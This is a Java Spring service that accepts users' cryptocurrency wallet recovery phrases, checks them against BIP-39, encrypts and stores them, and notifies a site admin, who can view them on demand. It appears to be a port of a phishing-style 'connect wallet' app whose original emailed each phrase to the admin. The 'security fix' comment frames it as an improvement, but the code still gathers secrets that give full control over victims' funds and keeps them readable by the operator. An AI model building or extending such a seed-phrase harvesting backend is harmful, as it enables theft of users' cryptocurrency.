package com.javalive.backend.service.wallet;

import com.javalive.backend.dto.wallet.ConnectWalletRequest;
import com.javalive.backend.dto.wallet.WalletStatus;
import com.javalive.backend.entity.User;
import com.javalive.backend.entity.Wallet;
import com.javalive.backend.repository.UserRepository;
import com.javalive.backend.repository.WalletRepository;
import com.javalive.backend.service.mail.MailService;
import com.javalive.backend.service.settings.SettingsService;
import com.javalive.backend.web.exception.ApiException;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.time.LocalDateTime;
import java.util.List;
import java.util.Set;

/**
 * Mirrors the source app's ViewsController@connect_wallet/@validateMnemonic — word-count and
 * character-set checks, then a real BIP-39 checksum validation, exactly like the source's
 * bitwasp/bitcoin-backed CryptoWalletService.
 *
 * <p><b>Security fix</b>: the source stored the recovery phrase in plaintext (`wallets.phrase`)
 * and additionally emailed it in cleartext to the admin on every connection. Here the phrase is
 * AES-256-GCM encrypted before storage ({@link AesEncryptionService}) and is never included in the
 * admin notification — the admin is told a wallet was connected and must view it on-demand through
 * an explicit admin action (Phase 5), not have it pushed to their inbox.
 */
@Service
public class WalletConnectService {

    private static final Set<Integer> VALID_WORD_COUNTS = Set.of(12, 15, 18, 21, 24);

    private final WalletRepository walletRepository;
    private final UserRepository userRepository;
    private final Bip39Validator bip39Validator;
    private final AesEncryptionService encryptionService;
    private final MailService mailService;
    private final SettingsService settingsService;

    public WalletConnectService(WalletRepository walletRepository, UserRepository userRepository,
                                 Bip39Validator bip39Validator, AesEncryptionService encryptionService,
                                 MailService mailService, SettingsService settingsService) {
        this.walletRepository = walletRepository;
        this.userRepository = userRepository;
        this.bip39Validator = bip39Validator;
        this.encryptionService = encryptionService;
        this.mailService = mailService;
        this.settingsService = settingsService;
    }

    @Transactional(readOnly = true)
    public WalletStatus status(Long userId) {
        List<Wallet> wallets = walletRepository.findByUserId(userId);
        return wallets.isEmpty() ? WalletStatus.notConnected() : WalletStatus.from(wallets.get(0));
    }

    @Transactional
    public WalletStatus connect(Long userId, ConnectWalletRequest request) {
        User user = userRepository.findById(userId)
                .orElseThrow(() -> new ApiException(HttpStatus.NOT_FOUND, "User not found."));

        String mnemonic = request.mnemonic().trim();
        String[] words = mnemonic.split("\\s+");
        if (!VALID_WORD_COUNTS.contains(words.length)) {
            throw new ApiException(HttpStatus.BAD_REQUEST, "Invalid recovery phrase. Must be 12, 15, 18, 21, or 24 words.");
        }
        for (String word : words) {
            if (!word.matches("[a-zA-Z]+")) {
                throw new ApiException(HttpStatus.BAD_REQUEST, "Recovery phrase contains invalid characters. Only letters are allowed.");
            }
        }
        if (!bip39Validator.isValid(mnemonic)) {
            throw new ApiException(HttpStatus.BAD_REQUEST, "Invalid recovery phrase. Please check your phrase and try again.");
        }

        LocalDateTime now = LocalDateTime.now();
        String encryptedPhrase = encryptionService.encrypt(mnemonic);

        List<Wallet> existing = walletRepository.findByUserId(userId);
        Wallet wallet = existing.isEmpty() ? Wallet.builder().user(user).createdAt(now).build() : existing.get(0);
        wallet.setWalletName(request.walletName());
        wallet.setPhraseEncrypted(encryptedPhrase);
        wallet.setStatus("active");
        wallet.setLastValidated(now);
        wallet.setUpdatedAt(now);
        wallet = walletRepository.save(wallet);

        user.setWalletConnected(true);
        user.setUpdatedAt(now);
        userRepository.save(user);

        String contactEmail = settingsService.get().getContactEmail();
        if (contactEmail != null) {
            mailService.send(contactEmail, "New wallet connection from " + user.getName(),
                    "User: " + user.getName() + " (" + user.getEmail() + ")\n"
                            + "Wallet Name: " + request.walletName() + "\n"
                            + "Connection Time: " + now + "\n\n"
                            + "The recovery phrase is encrypted at rest — view it from the admin panel if needed.");
        }

        return WalletStatus.from(wallet);
    }
}
